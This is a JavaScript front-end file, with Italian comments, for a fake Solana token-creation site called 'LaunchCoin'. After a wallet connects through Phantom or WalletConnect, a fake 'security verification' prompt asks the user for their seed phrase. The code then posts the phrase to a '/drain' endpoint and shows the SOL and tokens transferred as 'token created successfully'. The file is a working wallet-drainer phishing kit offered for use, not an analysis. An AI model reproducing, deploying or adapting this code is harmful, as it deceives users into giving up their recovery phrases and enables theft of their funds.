// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';
import { Web3Modal } from '@walletconnect/modal';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI TUTTE LE FUNZIONI SU window =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== WALLETCONNECT CON WEB3MODAL =====
let web3modal = null;
let provider = null;
let isConnecting = false;

async function initWeb3Modal() {
  if (!web3modal) {
    web3modal = new Web3Modal({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      themeMode: 'dark',
      themeVariables: {
        '--w3m-z-index': '10000',
        '--w3m-background-color': '#0b1022',
        '--w3m-accent-color': '#22d1f8',
      },
      // IMPORTANTE: abilita WalletConnect
      enableWalletConnect: true,
      walletConnectVersion: 2,
      // Mostra tutti i wallet
      includeWalletIds: [],
      excludeWalletIds: [],
      // Metadati
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
  }
  return web3modal;
}

// ===== CONNECT WALLET VIA WALLETCONNECT =====
async function connectWalletConnect() {
  if (isConnecting) return;
  isConnecting = true;
  
  try {
    // 1. Inizializza Web3Modal
    const modal = await initWeb3Modal();
    
    // 2. Apri il modal – questo mostrerà il QR
    await modal.open();
    
    // 3. Web3Modal gestisce la connessione automaticamente
    // Attendiamo che l'utente si connetta
    const session = await new Promise((resolve, reject) => {
      modal.subscribeEvents((event) => {
        if (event.type === 'session_connected') {
          resolve(event.data);
        }
        if (event.type === 'modal_closed') {
          reject(new Error('Modale chiuso dall\'utente'));
        }
      });
    });
    
    if (session && session.namespaces && session.namespaces.solana) {
      const accounts = session.namespaces.solana.accounts;
      if (accounts && accounts.length > 0) {
        walletPublicKey = accounts[0].split(':')[2];
        alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
        window.location.href = 'create.html';
        return;
      }
    }
    
    throw new Error('Nessun account trovato');
    
  } catch (e) {
    console.error('WalletConnect error:', e);
    alert('❌ WalletConnect fallito: ' + e.message);
    window.location.href = 'wallet.html';
  } finally {
    isConnecting = false;
  }
}

// ===== CONNECT WALLET (MAIN) =====
window.connectWallet = async function() {
  console.log('connectWallet chiamata');
  
  // 1. Prova Phantom (estensione)
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // 2. WalletConnect con QR
  await connectWalletConnect();
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('selectWallet chiamata:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  alert(
    '⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\n' +
    '1. Clicca "Connetti" nel popup che apparirà.\n' +
    '2. Scansiona il QR con l\'app del wallet.\n' +
    '3. Approva la connessione.'
  );
  // Chiama WalletConnect
  window.connectWallet();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
      'Il tuo wallet deve essere validato per completare la creazione del token.\n' +
      'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
      '(Questa operazione è necessaria per la sicurezza della rete)'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:12px;color:#8899bb;">🪙 ${data.tokenCount} token trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx SOL: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore di rete: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};

window.nextStep = function() { 
  if (currentStep < steps.length - 1) window.showStep(currentStep + 1); 
};

window.prevStep = function() { 
  if (currentStep > 0) window.showStep(currentStep - 1); 
};

// ===== INIZIALIZZA STEP =====
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU CLICCANDO FUORI =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato correttamente');
console.log('window.connectWallet:', typeof window.connectWallet);
console.log('window.selectWallet:', typeof window.selectWallet);
console.log('window.createCoin:', typeof window.createCoin);
